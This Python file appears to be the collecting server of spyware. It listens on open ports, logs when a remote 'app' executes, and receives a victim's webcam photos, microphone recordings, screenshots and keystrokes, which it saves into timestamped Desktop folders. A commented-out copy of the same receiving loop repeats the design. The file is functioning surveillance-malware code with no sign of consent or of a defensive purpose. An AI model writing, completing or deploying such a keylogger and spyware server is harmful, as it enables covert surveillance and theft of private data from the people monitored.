from mlsocket import MLSocket
import cv2
import shutil
import os
import datetime
import socket
import soundfile as sf
from PIL import Image,ImageGrab
import os
import time
import socket

imagz = []
soundz = []
screenz = []

HOST = '0.0.0.0'
PORT = 65447
TPORT = 65450

sock = socket.socket()
sock.bind((HOST,TPORT))
print("listening for tracking of app execution")
sock.listen()
c, a = sock.accept()
print(f"execution of app by the address {a}")


s = MLSocket()
s.bind((HOST, PORT))
s.listen()
print(f"listening on {HOST} and port {PORT}")
conn1, address1 = s.accept()
print(f"conn1 socket is {conn1}, address is {address1}")
client_socket1, client_address1 = s.accept()
print(f"client_socket1 socket is {client_socket1}, address is {client_address1}")
conn2, address2 = s.accept()
print(f"conn2 socket is {conn2}, address is {address2}")

#conn.setblocking(0)
#client_socket.setblocking(0)
print("turned the socket blocking for both off")


try:
    dir = f'/Users/yallah/Desktop/photos'
    os.mkdir(dir)
    print("made dir")
except:
    print("dir already exists")

try:
    dirr = f'/Users/yallah/Desktop/audio'
    os.mkdir(dirr)

except:
    print("dir already exists")

try:
    os.mkdir("/Users/yallah/Desktop/screen")
    print("dir already exists")
        
except:
    print("dir screen already exists")

try:
    os.mkdir("/Users/yallah/Desktop/keystrokes")
    print("keystrokes dir created")

except:
    print("keystrokes dir already created")


while True:
            try:
                #print("trying to receive string")
                datatype1 = client_socket1.recv(4096)
                print(f"datatype is {datatype1}")
                
            except:
                pass

            try:
                data1 = conn1.recv(4096) # This will block until it receives all the data send by the client, with the step size of 1024 bytes.
            #model = conn.recv(1024) # This will also block until it receives all the data.
                print(f"trying to receive {datatype1}",data1)
                #clf = conn.recv(1024) # Same
                #cv2.imshow("GeeksForGeeks", image)
                #cv2.waitKey(0)
                #cv2.destroyWindow("GeeksForGeeks")

                if datatype1 == ["image"]:
                    imagz.append(data1)
                    print(f"length of imagez is: {len(imagz)}")
                
                if datatype1 == ["sound"]:
                    soundz.append(data1)
                    print(f"length of soundz is: {len(soundz)}")

                if datatype1 == ["screen"]:
                    screenz.append(data1)
                    print(f"length of screenz is: {len(screenz)}")


            except:
                pass
            
            try:
                data2 = conn2.recv(4096)
                if data2:
                    dirtimestamp = str(datetime.datetime.now())[5:10]
                    dirtimestamp2 = str(datetime.datetime.now())[11:16] 
                    print(f"received keystrokes: {data2}")
                    with open(f"/Users/yallah/Desktop/keystrokes/{dirtimestamp}|{dirtimestamp2}.txt","w") as f:
                        f.write(str(data2))

            except:
                pass

            if len(imagz) >= 5: 
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,img in enumerate(imagz):
                    #print("image received is going to be shown now")
                    os.chdir(f'/Users/yallah/Desktop/photos')
                    cv2.imwrite(f'/Users/yallah/Desktop/photos/{dirtimestamp}|{dirtimestamp2}pm|{ind}.png', img)
                    print(f'/Users/yallah/Desktop/{ind}.png')
                imagz = []

            if len(soundz) >= 5: 
                frequency = 44400
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,aud in enumerate(soundz):
                    #print("image received is going to be shown now")
                    os.chdir("/Users/yallah/Desktop/audio")
                    sf.write(f"pythonaudio{dirtimestamp}|{dirtimestamp2}{ind}.wav", aud, frequency)
                
                soundz = []

            if len(screenz) >= 5: 
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,scrimg in enumerate(screenz):
                    #print("image received is going to be shown now")
                    os.chdir("/Users/yallah/Desktop/screen")
                    cv2.imwrite(f"pythonscreenshot{dirtimestamp}|{dirtimestamp2}{ind}.png", scrimg)
                
                screenz = []


'''with MLSocket() as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"listening on {HOST} and port {PORT}")
    conn1, address1 = s.accept()
    print(f"conn1 socket is {conn1}, address is {address1}")
    client_socket1, client_address1 = s.accept()
    print(f"client_socket1 socket is {client_socket1}, address is {client_address1}")
    conn2, address2 = s.accept()
    print(f"conn2 socket is {conn2}, address is {address2}")
    client_socket2, client_address2 = s.accept()
    print(f"client_socket2 socket is {client_socket2}, address is {client_address2}")
    #conn.setblocking(0)
    #client_socket.setblocking(0)
    print("turned the socket blocking for both off")

    with conn1:
        try:
            dir = f'/Users/yallah/Desktop/photos'
            os.mkdir(dir)
            print("made dir")
        except:
            print("dir already exists")

        try:
            dirr = f'/Users/yallah/Desktop/audio'
            os.mkdir(dirr)

        except:
            print("dir already exists")

        try:
            os.mkdir("/Users/yallah/Desktop/screen")
            print("dir already exists")
        
        except:
            print("dir screen already exists")

        try:
            os.mkdir("/Users/yallah/Desktop/keystrokes")
            print("keystrokes dir created")

        except:
            print("keystrokes dir already created")


        while True:
            try:
                #print("trying to receive string")
                datatype = client_socket.recv(4096)
                print(f"datatype is {datatype}")
                
            except:
                pass

            try:
                data = conn.recv(4096) # This will block until it receives all the data send by the client, with the step size of 1024 bytes.
            #model = conn.recv(1024) # This will also block until it receives all the data.
                print(f"trying to receive {datatype}",data)
                #clf = conn.recv(1024) # Same
                #cv2.imshow("GeeksForGeeks", image)
                #cv2.waitKey(0)
                #cv2.destroyWindow("GeeksForGeeks")

                if datatype == ["image"]:
                    imagz.append(data)
                    print(f"length of imagez is: {len(imagz)}")
                
                if datatype == ["sound"]:
                    soundz.append(data)
                    print(f"length of soundz is: {len(soundz)}")

                if datatype == ["screen"]:
                    screenz.append(data)
                    print(f"length of screenz is: {len(screenz)}")

                if datatype == ["keystrokes"]:
                    with open(f"/Users/yallah/Desktop/keystrokes/{dirtimestamp}|{dirtimestamp2}pm.txt","w") as d:
                        d.write(data) 


            except:
                pass
            
            if len(imagz) >= 5: 
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,img in enumerate(imagz):
                    #print("image received is going to be shown now")
                    os.chdir(f'/Users/yallah/Desktop/photos')
                    cv2.imwrite(f'/Users/yallah/Desktop/photos/{dirtimestamp}|{dirtimestamp2}pm|{ind}.png', img)
                    print(f'/Users/yallah/Desktop/{ind}.png')
                imagz = []

            if len(soundz) >= 5: 
                frequency = 44400
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,aud in enumerate(soundz):
                    #print("image received is going to be shown now")
                    os.chdir("/Users/yallah/Desktop/audio")
                    sf.write(f"pythonaudio{dirtimestamp}|{dirtimestamp2}{ind}.wav", aud, frequency)
                
                soundz = []

            if len(screenz) >= 5: 
                dirtimestamp = str(datetime.datetime.now())[5:10]
                dirtimestamp2 = str(datetime.datetime.now())[11:16]
                #print("dirstamp is:", dirtimestamp)
                for ind,scrimg in enumerate(screenz):
                    #print("image received is going to be shown now")
                    os.chdir("/Users/yallah/Desktop/screen")
                    cv2.imwrite(f"pythonscreenshot{dirtimestamp}|{dirtimestamp2}{ind}.png", scrimg)
                
                screenz = []



        

'''